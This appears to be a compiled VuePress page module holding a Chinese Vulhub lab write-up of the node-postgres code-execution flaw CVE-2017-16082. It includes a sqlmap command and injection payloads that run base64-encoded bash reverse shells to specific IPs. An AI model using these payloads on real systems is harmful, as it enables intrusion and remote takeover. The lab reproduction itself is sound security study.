import{_ as n}from"./plugin-vue_export-helper-c27b6911.js";import{r as i,o as r,c as s,a as e,b as o,d as a,e as l}from"./app-58e4a7d6.js";const d={},c=e("h2",{id:"漏洞描述",tabindex:"-1"},[e("a",{class:"header-anchor",href:"#漏洞描述","aria-hidden":"true"},"#"),o(" 漏洞描述")],-1),p=e("p",null,[o("node-postgres在处理类型为"),e("code",null,"Row Description"),o("的postgres返回包时，将字段名拼接到代码中。由于没有进行合理转义，导致一个特殊构造的字段名可逃逸出代码单引号限制，造成代码执行漏洞。")],-1),u=e("p",null,"参考链接：",-1),h={href:"https://www.leavesongs.com/PENETRATION/node-postgres-code-execution-vulnerability.html",target:"_blank",rel:"noopener noreferrer"},g={href:"https://node-postgres.com/announcements#2017-08-12-code-execution-vulnerability",target:"_blank",rel:"noopener noreferrer"},m={href:"https://zhuanlan.zhihu.com/p/28575189",target:"_blank",rel:"noopener noreferrer"},b=l('<h2 id="环境搭建" tabindex="-1"><a class="header-anchor" href="#环境搭建" aria-hidden="true">#</a> 环境搭建</h2><p>Vulhub编译及运行环境：</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>docker-compose build\ndocker-compose up -d\n</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div></div></div><h2 id="漏洞复现" tabindex="-1"><a class="header-anchor" href="#漏洞复现" aria-hidden="true">#</a> 漏洞复现</h2><p>成功运行后，访问<code>http://your-ip:3000/?id=1</code>即可查看到id为1的用户信息。</p><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202202281101307.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><p>用sqlmap即可发现此处存在注入点，且数据库为postgres：</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>python sqlmap.py -u http://your-ip:3000/?id=1 --dbs\n</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202202281102191.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><p>那么，我们就可以猜测这里存在node-postgres的代码执行漏洞。编写我想执行的命令<code>echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xNzIuMTkuMC4xLzIxIDA+JjE=|base64 -d|bash</code>，然后适当分割（每段长度不超过64字符）后替换在如下payload中：</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>SELECT 1 AS &quot;\\&#39;]=0;require=process.mainModule.constructor._load;/*&quot;, 2 AS &quot;*/p=require(`child_process`);/*&quot;, 3 AS &quot;*/p.exec(`echo YmFzaCAtaSA+JiAvZGV2L3R`+/*&quot;, 4 AS &quot;*/`jcC8xOTIuMTY4LjE3NC4xMjgvOTk5OSAwPiYxCgo= |base64 -d|bash`)//&quot;\n\nSELECT 1 AS &quot;\\&#39;]=0;require=process.mainModule.constructor._load;/*&quot;, 2 AS &quot;*/p=require(`child_process`);/*&quot;, 3 AS &quot;*/p.exec(`echo L2Jpbi9iYXNoIC1pID4mIC9kZXYvd`+/*&quot;, 4 AS &quot;*/`GNwLzEwMS40Mi4yMzcuNjEvMjMzMyAwPiYx |base64 -d|bash`)//&quot;\n</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>将上述payload编码后发送：</p><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202202281111534.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><p>成功执行命令，如反弹shell：</p><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202202281110043.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure>',15),_={href:"https://www.leavesongs.com/PENETRATION/node-postgres-code-execution-vulnerability.html",target:"_blank",rel:"noopener noreferrer"};function v(x,f){const t=i("ExternalLinkIcon");return r(),s("div",null,[c,p,u,e("ul",null,[e("li",null,[e("a",h,[o("https://www.leavesongs.com/PENETRATION/node-postgres-code-execution-vulnerability.html"),a(t)])]),e("li",null,[e("a",g,[o("https://node-postgres.com/announcements#2017-08-12-code-execution-vulnerability"),a(t)])]),e("li",null,[e("a",m,[o("https://zhuanlan.zhihu.com/p/28575189"),a(t)])])]),b,e("p",null,[o("因为复现过程中坑比较多，payload生成与测试过程中如果出现错误，还请多多阅读"),e("a",_,[o("P师傅的这篇文章"),a(t)]),o("，从原理上找到问题所在。")])])}const A=n(d,[["render",v],["__file","node-postgres 代码执行漏洞 CVE-2017-16082.html.vue"]]);export{A as default};
